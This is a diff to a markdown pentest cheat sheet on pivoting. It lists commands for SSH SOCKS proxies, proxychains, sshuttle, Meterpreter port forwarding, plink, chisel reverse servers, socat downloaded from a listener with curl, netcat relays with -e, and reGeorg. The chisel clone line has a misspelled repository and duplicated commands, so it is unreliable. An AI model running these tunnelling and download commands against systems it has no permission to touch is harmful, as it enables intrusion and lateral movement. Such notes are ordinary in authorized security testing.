@@ -30,30 +30,20 @@ ssh localhost -p 2222 -D 1234
 
 ### Proxychains
 
-1. choose any tools to create a socks proxy 
-
 ```bash
+# Choose any tools to create a socks proxy 
 ssh <target> -D 1234
-```
 
-2. configure proxychains.conf with the protocl and port you chose for the socks proxy
+# Configure proxychains.conf with the protocl and port you chose for the socks proxy
+sudo vim /etc/proxychains.conf 
+	quiet_mode				   # enable this 
+	socks5	127.0.0.1 1234     # change this
 
-`sudo vim /etc/proxychains.conf `
-
-```bash
-quiet_mode				   # enable this 
-socks5	127.0.0.1 1234     # change this
-```
-
-3. Use any tool prepending the proxychains command :
-
-```bash
+#Use any tool prepending the proxychains command :
 proxychains wpscan --url <url> 
 wpscan --url <url> --proxy socks5://127.0.0.1:1234 --force
-```
-> For nmap, you need to specify the -Pn and -sT arguments
 
-```bash
+# For nmap, you need to specify the -Pn and -sT arguments
 proxychains nmap -sT -Pn <target>
 ```
 > You can also forward a single port to avoid using a socks proxy, or use sshuttle
@@ -61,18 +51,14 @@ proxychains nmap -sT -Pn <target>
 
 ### SSHuttle
 
+transparent proxy over ssh
+
 ```sh
 # sudo apt-get update && sudo apt-get install sshuttle
 sshuttle -r <target_ip>:22 <target_network>/24
 ```
 
 ---
-
-### Plink
-
-```sh
-plink.exe -l root -pw password -R 445:127.0.0.1:445 <listener_ip> [-P <listener_port>] 
-```
 
 ### Meterpreter
 
@@ -86,9 +72,15 @@ exploit -j
 portfwd add -l 3389 -p 3389 -r <target>
 ```
 
-### Chisel
+### Plink
 
-* [chisel](https://github.com/jpillora/chisel) : Socks SSH for Windows
+```sh
+plink.exe -l root -pw password -R 445:127.0.0.1:445 <listener_ip> [-P <listener_port>] 
+```
+
+### [Chisel](https://github.com/jpillora/chisel)
+
+Socks proxy over SSH for Windows
 
 ```sh
 git clone git clone https://github.com/jpilloria/chisel && cd chisel && go build && go build -ldflags="-s -w" && upx build chisel && chmod +x chisel
@@ -96,8 +88,7 @@ git clone git clone https://github.com/jpilloria/chisel && cd chisel && go build
 chisel server -p 10000 --reverse
 ```
 
-
-### SOCAT
+### Socat
 
 ```sh
 curl -sL http://<listener_ip>:1234/socat -o /tmp/socat && chmod +x /tmp/socat && cd /tmp
@@ -117,15 +108,12 @@ nc -v -lk -p 8001 -e /usr/bin/nc 127.0.0.1 8000
 nc.traditional -l -p 8001 -c "nc 127.0.0.1 8000"
 ```
 
-## ReGeorg
+## [ReGeorg](https://github.com/sensepost/reGeorg)
 
 Socks proxy over web
 
-* [reGeorg](https://github.com/sensepost/reGeorg)
-
-
-## Nmap like
+## [PortqryUI](https://www.microsoft.com/en-us/download/details.aspx?id=24009)
 
 Nmap like for windows
 
-[PortqryUI](https://www.microsoft.com/en-us/download/details.aspx?id=24009)
+
